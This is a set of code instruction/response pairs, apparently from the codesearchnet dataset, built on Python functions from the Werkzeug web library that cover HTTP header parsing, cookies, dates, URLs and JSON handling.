{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nparsing a string with a dict header.", "response": "def parse_dict_header(value, cls=dict):\n    \"\"\"Parse lists of key, value pairs as described by RFC 2068 Section 2 and\n    convert them into a python dict (or any other mapping object created from\n    the type with a dict like interface provided by the `cls` argument):\n\n    >>> d = parse_dict_header('foo=\"is a fish\", bar=\"as well\"')\n    >>> type(d) is dict\n    True\n    >>> sorted(d.items())\n    [('bar', 'as well'), ('foo', 'is a fish')]\n\n    If there is no value for a key it will be `None`:\n\n    >>> parse_dict_header('key_without_value')\n    {'key_without_value': None}\n\n    To create a header from the :class:`dict` again, use the\n    :func:`dump_header` function.\n\n    .. versionchanged:: 0.9\n       Added support for `cls` argument.\n\n    :param value: a string with a dict header.\n    :param cls: callable to use for storage of parsed results.\n    :return: an instance of `cls`\n    \"\"\"\n    result = cls()\n    if not isinstance(value, text_type):\n        # XXX: validate\n        value = bytes_to_wsgi(value)\n    for item in _parse_list_header(value):\n        if \"=\" not in item:\n            result[item] = None\n            continue\n        name, value = item.split(\"=\", 1)\n        if value[:1] == value[-1:] == '\"':\n            value = unquote_header_value(value[1:-1])\n        result[name] = value\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_options_header(value, multiple=False):\n    if not value:\n        return \"\", {}\n\n    result = []\n\n    value = \",\" + value.replace(\"\\n\", \",\")\n    while value:\n        match = _option_header_start_mime_type.match(value)\n        if not match:\n            break\n        result.append(match.group(1))  # mimetype\n        options = {}\n        # Parse options\n        rest = match.group(2)\n        continued_encoding = None\n        while rest:\n            optmatch = _option_header_piece_re.match(rest)\n            if not optmatch:\n                break\n            option, count, encoding, language, option_value = optmatch.groups()\n            # Continuations don't have to supply the encoding after the\n            # first line. If we're in a continuation, track the current\n            # encoding to use for subsequent lines. Reset it when the\n            # continuation ends.\n            if not count:\n                continued_encoding = None\n            else:\n                if not encoding:\n                    encoding = continued_encoding\n                continued_encoding = encoding\n            option = unquote_header_value(option)\n            if option_value is not None:\n                option_value = unquote_header_value(option_value, option == \"filename\")\n                if encoding is not None:\n                    option_value = _unquote(option_value).decode(encoding)\n            if count:\n                # Continuations append to the existing value. For\n                # simplicity, this ignores the possibility of\n                # out-of-order indices, which shouldn't happen anyway.\n                options[option] = options.get(option, \"\") + option_value\n            else:\n                options[option] = option_value\n            rest = rest[optmatch.end() :]\n        result.append(options)\n        if multiple is False:\n            return tuple(result)\n        value = rest\n\n    return tuple(result) if result else (\"\", {})", "response": "Parse a Content - Type - like header into a tuple with the mimetype options and language."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_accept_header(value, cls=None):\n    if cls is None:\n        cls = Accept\n\n    if not value:\n        return cls(None)\n\n    result = []\n    for match in _accept_re.finditer(value):\n        quality = match.group(2)\n        if not quality:\n            quality = 1\n        else:\n            quality = max(min(float(quality), 1), 0)\n        result.append((match.group(1), quality))\n    return cls(result)", "response": "Parses an HTTP Accept - * header string and returns an instance of cls."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef parse_cache_control_header(value, on_update=None, cls=None):\n    if cls is None:\n        cls = RequestCacheControl\n    if not value:\n        return cls(None, on_update)\n    return cls(parse_dict_header(value), on_update)", "response": "Parses a cache control header."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef parse_set_header(value, on_update=None):\n    if not value:\n        return HeaderSet(None, on_update)\n    return HeaderSet(parse_list_header(value), on_update)", "response": "Parse a set - like header and return a new HeaderSet object."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nparses an HTTP basic or digest authorization header transmitted by the web browser.", "response": "def parse_authorization_header(value):\n    \"\"\"Parse an HTTP basic/digest authorization header transmitted by the web\n    browser.  The return value is either `None` if the header was invalid or\n    not given, otherwise an :class:`~werkzeug.datastructures.Authorization`\n    object.\n\n    :param value: the authorization header to parse.\n    :return: a :class:`~werkzeug.datastructures.Authorization` object or `None`.\n    \"\"\"\n    if not value:\n        return\n    value = wsgi_to_bytes(value)\n    try:\n        auth_type, auth_info = value.split(None, 1)\n        auth_type = auth_type.lower()\n    except ValueError:\n        return\n    if auth_type == b\"basic\":\n        try:\n            username, password = base64.b64decode(auth_info).split(b\":\", 1)\n        except Exception:\n            return\n        return Authorization(\n            \"basic\",\n            {\n                \"username\": to_unicode(username, _basic_auth_charset),\n                \"password\": to_unicode(password, _basic_auth_charset),\n            },\n        )\n    elif auth_type == b\"digest\":\n        auth_map = parse_dict_header(auth_info)\n        for key in \"username\", \"realm\", \"nonce\", \"uri\", \"response\":\n            if key not in auth_map:\n                return\n        if \"qop\" in auth_map:\n            if not auth_map.get(\"nc\") or not auth_map.get(\"cnonce\"):\n                return\n        return Authorization(\"digest\", auth_map)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nparsing an HTTP WWW - Authenticate header into a new object.", "response": "def parse_www_authenticate_header(value, on_update=None):\n    \"\"\"Parse an HTTP WWW-Authenticate header into a\n    :class:`~werkzeug.datastructures.WWWAuthenticate` object.\n\n    :param value: a WWW-Authenticate header to parse.\n    :param on_update: an optional callable that is called every time a value\n                      on the :class:`~werkzeug.datastructures.WWWAuthenticate`\n                      object is changed.\n    :return: a :class:`~werkzeug.datastructures.WWWAuthenticate` object.\n    \"\"\"\n    if not value:\n        return WWWAuthenticate(on_update=on_update)\n    try:\n        auth_type, auth_info = value.split(None, 1)\n        auth_type = auth_type.lower()\n    except (ValueError, AttributeError):\n        return WWWAuthenticate(value.strip().lower(), on_update=on_update)\n    return WWWAuthenticate(auth_type, parse_dict_header(auth_info), on_update)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nparsing an if - range header which can be an etag or a date. Returns a : class : ~werkzeug. datastructures. IfRange object.", "response": "def parse_if_range_header(value):\n    \"\"\"Parses an if-range header which can be an etag or a date.  Returns\n    a :class:`~werkzeug.datastructures.IfRange` object.\n\n    .. versionadded:: 0.7\n    \"\"\"\n    if not value:\n        return IfRange()\n    date = parse_date(value)\n    if date is not None:\n        return IfRange(date=date)\n    # drop weakness information\n    return IfRange(unquote_etag(value)[0])"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef parse_date(value):\n    if value:\n        t = parsedate_tz(value.strip())\n        if t is not None:\n            try:\n                year = t[0]\n                # unfortunately that function does not tell us if two digit\n                # years were part of the string, or if they were prefixed\n                # with two zeroes.  So what we do is to assume that 69-99\n                # refer to 1900, and everything below to 2000\n                if year >= 0 and year <= 68:\n                    year += 2000\n                elif year >= 69 and year <= 99:\n                    year += 1900\n                return datetime(*((year,) + t[1:7])) - timedelta(seconds=t[-1] or 0)\n            except (ValueError, OverflowError):\n                return None", "response": "Parse one of the date formats into a datetime object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nusing for http_date and cookie_date.", "response": "def _dump_date(d, delim):\n    \"\"\"Used for `http_date` and `cookie_date`.\"\"\"\n    if d is None:\n        d = gmtime()\n    elif isinstance(d, datetime):\n        d = d.utctimetuple()\n    elif isinstance(d, (integer_types, float)):\n        d = gmtime(d)\n    return \"%s, %02d%s%s%s%s %02d:%02d:%02d GMT\" % (\n        (\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\")[d.tm_wday],\n        d.tm_mday,\n        delim,\n        (\n            \"Jan\",\n            \"Feb\",\n            \"Mar\",\n            \"Apr\",\n            \"May\",\n            \"Jun\",\n            \"Jul\",\n            \"Aug\",\n            \"Sep\",\n            \"Oct\",\n            \"Nov\",\n            \"Dec\",\n        )[d.tm_mon - 1],\n        delim,\n        str(d.tm_year),\n        d.tm_hour,\n        d.tm_min,\n        d.tm_sec,\n    )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nparses a base - 10 integer count of seconds into a timedelta.", "response": "def parse_age(value=None):\n    \"\"\"Parses a base-10 integer count of seconds into a timedelta.\n\n    If parsing fails, the return value is `None`.\n\n    :param value: a string consisting of an integer represented in base-10\n    :return: a :class:`datetime.timedelta` object or `None`.\n    \"\"\"\n    if not value:\n        return None\n    try:\n        seconds = int(value)\n    except ValueError:\n        return None\n    if seconds < 0:\n        return None\n    try:\n        return timedelta(seconds=seconds)\n    except OverflowError:\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nformat the duration as a base - 10 integer.", "response": "def dump_age(age=None):\n    \"\"\"Formats the duration as a base-10 integer.\n\n    :param age: should be an integer number of seconds,\n                a :class:`datetime.timedelta` object, or,\n                if the age is unknown, `None` (default).\n    \"\"\"\n    if age is None:\n        return\n    if isinstance(age, timedelta):\n        # do the equivalent of Python 2.7's timedelta.total_seconds(),\n        # but disregarding fractional seconds\n        age = age.seconds + (age.days * 24 * 3600)\n\n    age = int(age)\n    if age < 0:\n        raise ValueError(\"age cannot be negative\")\n\n    return str(age)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef is_resource_modified(\n    environ, etag=None, data=None, last_modified=None, ignore_if_range=True\n):\n    \"\"\"Convenience method for conditional requests.\n\n    :param environ: the WSGI environment of the request to be checked.\n    :param etag: the etag for the response for comparison.\n    :param data: or alternatively the data of the response to automatically\n                 generate an etag using :func:`generate_etag`.\n    :param last_modified: an optional date of the last modification.\n    :param ignore_if_range: If `False`, `If-Range` header will be taken into\n                            account.\n    :return: `True` if the resource was modified, otherwise `False`.\n    \"\"\"\n    if etag is None and data is not None:\n        etag = generate_etag(data)\n    elif data is not None:\n        raise TypeError(\"both data and etag given\")\n    if environ[\"REQUEST_METHOD\"] not in (\"GET\", \"HEAD\"):\n        return False\n\n    unmodified = False\n    if isinstance(last_modified, string_types):\n        last_modified = parse_date(last_modified)\n\n    # ensure that microsecond is zero because the HTTP spec does not transmit\n    # that either and we might have some false positives.  See issue #39\n    if last_modified is not None:\n        last_modified = last_modified.replace(microsecond=0)\n\n    if_range = None\n    if not ignore_if_range and \"HTTP_RANGE\" in environ:\n        # https://tools.ietf.org/html/rfc7233#section-3.2\n        # A server MUST ignore an If-Range header field received in a request\n        # that does not contain a Range header field.\n        if_range = parse_if_range_header(environ.get(\"HTTP_IF_RANGE\"))\n\n    if if_range is not None and if_range.date is not None:\n        modified_since = if_range.date\n    else:\n        modified_since = parse_date(environ.get(\"HTTP_IF_MODIFIED_SINCE\"))\n\n    if modified_since and last_modified and last_modified <= modified_since:\n        unmodified = True\n\n    if etag:\n        etag, _ = unquote_etag(etag)\n        if if_range is not None and if_range.etag is not None:\n            unmodified = parse_etags(if_range.etag).contains(etag)\n        else:\n            if_none_match = parse_etags(environ.get(\"HTTP_IF_NONE_MATCH\"))\n            if if_none_match:\n                # https://tools.ietf.org/html/rfc7232#section-3.2\n                # \"A recipient MUST use the weak comparison function when comparing\n                # entity-tags for If-None-Match\"\n                unmodified = if_none_match.contains_weak(etag)\n\n            # https://tools.ietf.org/html/rfc7232#section-3.1\n            # \"Origin server MUST use the strong comparison function when\n            # comparing entity-tags for If-Match\"\n            if_match = parse_etags(environ.get(\"HTTP_IF_MATCH\"))\n            if if_match:\n                unmodified = not if_match.is_strong(etag)\n\n    return not unmodified", "response": "Returns True if the resource was modified."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nremove all entity headers from a list or a list of headers.", "response": "def remove_entity_headers(headers, allowed=(\"expires\", \"content-location\")):\n    \"\"\"Remove all entity headers from a list or :class:`Headers` object.  This\n    operation works in-place.  `Expires` and `Content-Location` headers are\n    by default not removed.  The reason for this is :rfc:`2616` section\n    10.3.5 which specifies some entity headers that should be sent.\n\n    .. versionchanged:: 0.5\n       added `allowed` parameter.\n\n    :param headers: a list or :class:`Headers` object.\n    :param allowed: a list of headers that should still be allowed even though\n                    they are entity headers.\n    \"\"\"\n    allowed = set(x.lower() for x in allowed)\n    headers[:] = [\n        (key, value)\n        for key, value in headers\n        if not is_entity_header(key) or key.lower() in allowed\n    ]"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nremove all HTTP / 1. 1 Hop - by - Hop headers from a list or .", "response": "def remove_hop_by_hop_headers(headers):\n    \"\"\"Remove all HTTP/1.1 \"Hop-by-Hop\" headers from a list or\n    :class:`Headers` object.  This operation works in-place.\n\n    .. versionadded:: 0.5\n\n    :param headers: a list or :class:`Headers` object.\n    \"\"\"\n    headers[:] = [\n        (key, value) for key, value in headers if not is_hop_by_hop_header(key)\n    ]"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef parse_cookie(header, charset=\"utf-8\", errors=\"replace\", cls=None):\n    if isinstance(header, dict):\n        header = header.get(\"HTTP_COOKIE\", \"\")\n    elif header is None:\n        header = \"\"\n\n    # If the value is an unicode string it's mangled through latin1.  This\n    # is done because on PEP 3333 on Python 3 all headers are assumed latin1\n    # which however is incorrect for cookies, which are sent in page encoding.\n    # As a result we\n    if isinstance(header, text_type):\n        header = header.encode(\"latin1\", \"replace\")\n\n    if cls is None:\n        cls = TypeConversionDict\n\n    def _parse_pairs():\n        for key, val in _cookie_parse_impl(header):\n            key = to_unicode(key, charset, errors, allow_none_charset=True)\n            if not key:\n                continue\n            val = to_unicode(val, charset, errors, allow_none_charset=True)\n            yield try_coerce_native(key), val\n\n    return cls(_parse_pairs())", "response": "Parse a cookie from a string or WSGI environment."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ndumping a cookie to a new Set - Cookie header.", "response": "def dump_cookie(\n    key,\n    value=\"\",\n    max_age=None,\n    expires=None,\n    path=\"/\",\n    domain=None,\n    secure=False,\n    httponly=False,\n    charset=\"utf-8\",\n    sync_expires=True,\n    max_size=4093,\n    samesite=None,\n):\n    \"\"\"Creates a new Set-Cookie header without the ``Set-Cookie`` prefix\n    The parameters are the same as in the cookie Morsel object in the\n    Python standard library but it accepts unicode data, too.\n\n    On Python 3 the return value of this function will be a unicode\n    string, on Python 2 it will be a native string.  In both cases the\n    return value is usually restricted to ascii as the vast majority of\n    values are properly escaped, but that is no guarantee.  If a unicode\n    string is returned it's tunneled through latin1 as required by\n    PEP 3333.\n\n    The return value is not ASCII safe if the key contains unicode\n    characters.  This is technically against the specification but\n    happens in the wild.  It's strongly recommended to not use\n    non-ASCII values for the keys.\n\n    :param max_age: should be a number of seconds, or `None` (default) if\n                    the cookie should last only as long as the client's\n                    browser session.  Additionally `timedelta` objects\n                    are accepted, too.\n    :param expires: should be a `datetime` object or unix timestamp.\n    :param path: limits the cookie to a given path, per default it will\n                 span the whole domain.\n    :param domain: Use this if you want to set a cross-domain cookie. For\n                   example, ``domain=\".example.com\"`` will set a cookie\n                   that is readable by the domain ``www.example.com``,\n                   ``foo.example.com`` etc. Otherwise, a cookie will only\n                   be readable by the domain that set it.\n    :param secure: The cookie will only be available via HTTPS\n    :param httponly: disallow JavaScript to access the cookie.  This is an\n                     extension to the cookie standard and probably not\n                     supported by all browsers.\n    :param charset: the encoding for unicode values.\n    :param sync_expires: automatically set expires if max_age is defined\n                         but expires not.\n    :param max_size: Warn if the final header value exceeds this size. The\n        default, 4093, should be safely `supported by most browsers\n        <cookie_>`_. Set to 0 to disable this check.\n    :param samesite: Limits the scope of the cookie such that it will only\n                     be attached to requests if those requests are \"same-site\".\n\n    .. _`cookie`: http://browsercookielimits.squawky.net/\n    \"\"\"\n    key = to_bytes(key, charset)\n    value = to_bytes(value, charset)\n\n    if path is not None:\n        path = iri_to_uri(path, charset)\n    domain = _make_cookie_domain(domain)\n    if isinstance(max_age, timedelta):\n        max_age = (max_age.days * 60 * 60 * 24) + max_age.seconds\n    if expires is not None:\n        if not isinstance(expires, string_types):\n            expires = cookie_date(expires)\n    elif max_age is not None and sync_expires:\n        expires = to_bytes(cookie_date(time() + max_age))\n\n    samesite = samesite.title() if samesite else None\n    if samesite not in (\"Strict\", \"Lax\", None):\n        raise ValueError(\"invalid SameSite value; must be 'Strict', 'Lax' or None\")\n\n    buf = [key + b\"=\" + _cookie_quote(value)]\n\n    # XXX: In theory all of these parameters that are not marked with `None`\n    # should be quoted.  Because stdlib did not quote it before I did not\n    # want to introduce quoting there now.\n    for k, v, q in (\n        (b\"Domain\", domain, True),\n        (b\"Expires\", expires, False),\n        (b\"Max-Age\", max_age, False),\n        (b\"Secure\", secure, None),\n        (b\"HttpOnly\", httponly, None),\n        (b\"Path\", path, False),\n        (b\"SameSite\", samesite, False),\n    ):\n        if q is None:\n            if v:\n                buf.append(k)\n            continue\n\n        if v is None:\n            continue\n\n        tmp = bytearray(k)\n        if not isinstance(v, (bytes, bytearray)):\n            v = to_bytes(text_type(v), charset)\n        if q:\n            v = _cookie_quote(v)\n        tmp += b\"=\" + v\n        buf.append(bytes(tmp))\n\n    # The return value will be an incorrectly encoded latin1 header on\n    # Python 3 for consistency with the headers object and a bytestring\n    # on Python 2 because that's how the API makes more sense.\n    rv = b\"; \".join(buf)\n    if not PY2:\n        rv = rv.decode(\"latin1\")\n\n    # Warn if the final value of the cookie is less than the limit. If the\n    # cookie is too large, then it may be silently ignored, which can be quite\n    # hard to debug.\n    cookie_size = len(rv)\n\n    if max_size and cookie_size > max_size:\n        value_size = len(value)\n        warnings.warn(\n            'The \"{key}\" cookie is too large: the value was {value_size} bytes'\n            \" but the header required {extra_size} extra bytes. The final size\"\n            \" was {cookie_size} bytes but the limit is {max_size} bytes.\"\n            \" Browsers may silently ignore cookies larger than this.\".format(\n                key=key,\n                value_size=value_size,\n                extra_size=cookie_size - value_size,\n                cookie_size=cookie_size,\n                max_size=max_size,\n            ),\n            stacklevel=2,\n        )\n\n    return rv"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef is_byte_range_valid(start, stop, length):\n    if (start is None) != (stop is None):\n        return False\n    elif start is None:\n        return length is None or length >= 0\n    elif length is None:\n        return 0 <= start < stop\n    elif start >= stop:\n        return False\n    return 0 <= start < length", "response": "Checks if a given byte content range is valid for the given length."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nexpose this function to the web layer.", "response": "def expose(url_rule, endpoint=None, **kwargs):\n    \"\"\"Expose this function to the web layer.\"\"\"\n\n    def decorate(f):\n        e = endpoint or f.__name__\n        endpoints[e] = f\n        url_map.add(Rule(url_rule, endpoint=e, **kwargs))\n        return f\n\n    return decorate"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nrendering a template into a response.", "response": "def render_template(template_name, **context):\n    \"\"\"Render a template into a response.\"\"\"\n    tmpl = jinja_env.get_template(template_name)\n    context[\"url_for\"] = url_for\n    return Response(tmpl.render(context), mimetype=\"text/html\")"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nadding paragraphs to a text.", "response": "def nl2p(s):\n    \"\"\"Add paragraphs to a text.\"\"\"\n    return u\"\\n\".join(u\"<p>%s</p>\" % p for p in _par_re.split(s))"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nresolves HTML entities and remove tags from a string.", "response": "def strip_tags(s):\n    \"\"\"Resolve HTML entities and remove tags from a string.\"\"\"\n\n    def handle_match(m):\n        name = m.group(1)\n        if name in html_entities:\n            return unichr(html_entities[name])\n        if name[:2] in (\"#x\", \"#X\"):\n            try:\n                return unichr(int(name[2:], 16))\n            except ValueError:\n                return u\"\"\n        elif name.startswith(\"#\"):\n            try:\n                return unichr(int(name[1:]))\n            except ValueError:\n                return u\"\"\n        return u\"\"\n\n    return _entity_re.sub(handle_match, _striptags_re.sub(\"\", s))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck if the mimetype indicates JSON data.", "response": "def is_json(self):\n        \"\"\"Check if the mimetype indicates JSON data, either\n        :mimetype:`application/json` or :mimetype:`application/*+json`.\n        \"\"\"\n        mt = self.mimetype\n        return (\n            mt == \"application/json\"\n            or mt.startswith(\"application/\")\n            and mt.endswith(\"+json\")\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nparses the data as JSON and return the result.", "response": "def get_json(self, force=False, silent=False, cache=True):\n        \"\"\"Parse :attr:`data` as JSON.\n\n        If the mimetype does not indicate JSON\n        (:mimetype:`application/json`, see :meth:`is_json`), this\n        returns ``None``.\n\n        If parsing fails, :meth:`on_json_loading_failed` is called and\n        its return value is used as the return value.\n\n        :param force: Ignore the mimetype and always try to parse JSON.\n        :param silent: Silence parsing errors and return ``None``\n            instead.\n        :param cache: Store the parsed JSON to return for subsequent\n            calls.\n        \"\"\"\n        if cache and self._cached_json[silent] is not Ellipsis:\n            return self._cached_json[silent]\n\n        if not (force or self.is_json):\n            return None\n\n        data = self._get_data_for_json(cache=cache)\n\n        try:\n            rv = self.json_module.loads(data)\n        except ValueError as e:\n            if silent:\n                rv = None\n\n                if cache:\n                    normal_rv, _ = self._cached_json\n                    self._cached_json = (normal_rv, rv)\n            else:\n                rv = self.on_json_loading_failed(e)\n\n                if cache:\n                    _, silent_rv = self._cached_json\n                    self._cached_json = (rv, silent_rv)\n        else:\n            if cache:\n                self._cached_json = (rv, rv)\n\n        return rv"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _get_trusted_comma(self, trusted, value):\n        if not (trusted and value):\n            return\n        values = [x.strip() for x in value.split(\",\")]\n        if len(values) >= trusted:\n            return values[-trusted]", "response": "Get the real value from a comma - separated header based on the\n            configured number of trusted proxies."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef sync():\n    for blog in Blog.query.all():\n        # parse the feed. feedparser.parse will never given an exception\n        # but the bozo bit might be defined.\n        feed = feedparser.parse(blog.feed_url)\n\n        for entry in feed.entries:\n            # get the guid. either the id if specified, otherwise the link.\n            # if none is available we skip the entry.\n            guid = entry.get(\"id\") or entry.get(\"link\")\n            if not guid:\n                continue\n\n            # get an old entry for the guid to check if we need to update\n            # or recreate the item\n            old_entry = Entry.query.filter_by(guid=guid).first()\n\n            # get title, url and text. skip if no title or no text is\n            # given. if the link is missing we use the blog link.\n            if \"title_detail\" in entry:\n                title = entry.title_detail.get(\"value\") or \"\"\n                if entry.title_detail.get(\"type\") in HTML_MIMETYPES:\n                    title = strip_tags(title)\n                else:\n                    title = escape(title)\n            else:\n                title = entry.get(\"title\")\n            url = entry.get(\"link\") or blog.blog_url\n            text = (\n                \"content\" in entry and entry.content[0] or entry.get(\"summary_detail\")\n            )\n\n            if not title or not text:\n                continue\n\n            # if we have an html text we use that, otherwise we HTML\n            # escape the text and use that one. We also handle XHTML\n            # with our tag soup parser for the moment.\n            if text.get(\"type\") not in HTML_MIMETYPES:\n                text = escape(nl2p(text.get(\"value\") or \"\"))\n            else:\n                text = text.get(\"value\") or \"\"\n\n            # no text? continue\n            if not text.strip():\n                continue\n\n            # get the pub date and updated date. This is rather complex\n            # because different feeds do different stuff\n            pub_date = (\n                entry.get(\"published_parsed\")\n                or entry.get(\"created_parsed\")\n                or entry.get(\"date_parsed\")\n            )\n            updated = entry.get(\"updated_parsed\") or pub_date\n            pub_date = pub_date or updated\n\n            # if we don't have a pub_date we skip.\n            if not pub_date:\n                continue\n\n            # convert the time tuples to datetime objects.\n            pub_date = datetime(*pub_date[:6])\n            updated = datetime(*updated[:6])\n            if old_entry and updated <= old_entry.last_update:\n                continue\n\n            # create a new entry object based on the data collected or\n            # update the old one.\n            entry = old_entry or Entry()\n            entry.blog = blog\n            entry.guid = guid\n            entry.title = title\n            entry.url = url\n            entry.text = text\n            entry.pub_date = pub_date\n            entry.last_update = updated\n            session.add(entry)\n\n    session.commit()", "response": "Synchronizes the articles with the current blog."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef url_unquote_plus(s, charset=\"utf-8\", errors=\"replace\"):\n    if isinstance(s, text_type):\n        s = s.replace(u\"+\", u\" \")\n    else:\n        s = s.replace(b\"+\", b\" \")\n    return url_unquote(s, charset, errors)", "response": "URL decode a single string with the given charset and decode + to\n    whitespace."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nuses in codec_error_url_quote to re - quote any invalid bytes.", "response": "def _codec_error_url_quote(e):\n    \"\"\"Used in :func:`uri_to_iri` after unquoting to re-quote any\n    invalid bytes.\n    \"\"\"\n    out = _fast_url_quote(e.object[e.start : e.end])\n\n    if PY2:\n        out = out.decode(\"utf-8\")\n\n    return out, e.end"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\njoin a base URL and a possibly relative URL to form an absolute URL.", "response": "def url_join(base, url, allow_fragments=True):\n    \"\"\"Join a base URL and a possibly relative URL to form an absolute\n    interpretation of the latter.\n\n    :param base: the base URL for the join operation.\n    :param url: the URL to join.\n    :param allow_fragments: indicates whether fragments should be allowed.\n    \"\"\"\n    if isinstance(base, tuple):\n        base = url_unparse(base)\n    if isinstance(url, tuple):\n        url = url_unparse(url)\n\n    base, url = normalize_string_tuple((base, url))\n    s = make_literal_wrapper(base)\n\n    if not base:\n        return url\n    if not url:\n        return base\n\n    bscheme, bnetloc, bpath, bquery, bfragment = url_parse(\n        base, allow_fragments=allow_fragments\n    )\n    scheme, netloc, path, query, fragment = url_parse(url, bscheme, allow_fragments)\n    if scheme != bscheme:\n        return url\n    if netloc:\n        return url_unparse((scheme, netloc, path, query, fragment))\n    netloc = bnetloc\n\n    if path[:1] == s(\"/\"):\n        segments = path.split(s(\"/\"))\n    elif not path:\n        segments = bpath.split(s(\"/\"))\n        if not query:\n            query = bquery\n    else:\n        segments = bpath.split(s(\"/\"))[:-1] + path.split(s(\"/\"))\n\n    # If the rightmost part is \"./\" we want to keep the slash but\n    # remove the dot.\n    if segments[-1] == s(\".\"):\n        segments[-1] = s(\"\")\n\n    # Resolve \"..\" and \".\"\n    segments = [segment for segment in segments if segment != s(\".\")]\n    while 1:\n        i = 1\n        n = len(segments) - 1\n        while i < n:\n            if segments[i] == s(\"..\") and segments[i - 1] not in (s(\"\"), s(\"..\")):\n                del segments[i - 1 : i + 1]\n                break\n            i += 1\n        else:\n            break\n\n    # Remove trailing \"..\" if the URL is absolute\n    unwanted_marker = [s(\"\"), s(\"..\")]\n    while segments[:2] == unwanted_marker:\n        del segments[1]\n\n    path = s(\"/\").join(segments)\n    return url_unparse((scheme, netloc, path, query, fragment))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef ascii_host(self):\n        rv = self.host\n        if rv is not None and isinstance(rv, text_type):\n            try:\n                rv = _encode_idna(rv)\n            except UnicodeError:\n                rv = rv.encode(\"ascii\", \"ignore\")\n        return to_native(rv, \"ascii\", \"ignore\")", "response": "Returns a result that is restricted to ASCII."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef port(self):\n        try:\n            rv = int(to_native(self._split_host()[1]))\n            if 0 <= rv <= 65535:\n                return rv\n        except (ValueError, TypeError):\n            pass", "response": "The port in the URL as an integer if it was present None otherwise."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the server and location of the file in the form of tuple with the server and location.", "response": "def get_file_location(self, pathformat=None):\n        \"\"\"Returns a tuple with the location of the file in the form\n        ``(server, location)``.  If the netloc is empty in the URL or\n        points to localhost, it's represented as ``None``.\n\n        The `pathformat` by default is autodetection but needs to be set\n        when working with URLs of a specific system.  The supported values\n        are ``'windows'`` when working with Windows or DOS paths and\n        ``'posix'`` when working with posix paths.\n\n        If the URL does not point to a local file, the server and location\n        are both represented as ``None``.\n\n        :param pathformat: The expected format of the path component.\n                           Currently ``'windows'`` and ``'posix'`` are\n                           supported.  Defaults to ``None`` which is\n                           autodetect.\n        \"\"\"\n        if self.scheme != \"file\":\n            return None, None\n\n        path = url_unquote(self.path)\n        host = self.netloc or None\n\n        if pathformat is None:\n            if os.name == \"nt\":\n                pathformat = \"windows\"\n            else:\n                pathformat = \"posix\"\n\n        if pathformat == \"windows\":\n            if path[:1] == \"/\" and path[1:2].isalpha() and path[2:3] in \"|:\":\n                path = path[1:2] + \":\" + path[3:]\n            windows_share = path[:3] in (\"\\\\\" * 3, \"/\" * 3)\n            import ntpath\n\n            path = ntpath.normpath(path)\n            # Windows shared drives are represented as ``\\\\host\\\\directory``.\n            # That results in a URL like ``file://///host/directory``, and a\n            # path like ``///host/directory``. We need to special-case this\n            # because the path contains the hostname.\n            if windows_share and host is None:\n                parts = path.lstrip(\"\\\\\").split(\"\\\\\", 1)\n                if len(parts) == 2:\n                    host, path = parts\n                else:\n                    host = parts[0]\n                    path = \"\"\n        elif pathformat == \"posix\":\n            import posixpath\n\n            path = posixpath.normpath(path)\n        else:\n            raise TypeError(\"Invalid path format %s\" % repr(pathformat))\n\n        if host in (\"127.0.0.1\", \"::1\", \"localhost\"):\n            host = None\n\n        return host, path"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nloads and generate a template.", "response": "def generate_template(template_name, **context):\n    \"\"\"Load and generate a template.\"\"\"\n    context.update(href=href, format_datetime=format_datetime)\n    return template_loader.load(template_name).generate(**context)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef href(*args, **kw):\n    result = [(request.script_root if request else \"\") + \"/\"]\n    for idx, arg in enumerate(args):\n        result.append((\"/\" if idx else \"\") + url_quote(arg))\n    if kw:\n        result.append(\"?\" + url_encode(kw))\n    return \"\".join(result)", "response": "Simple function for URL generation."}
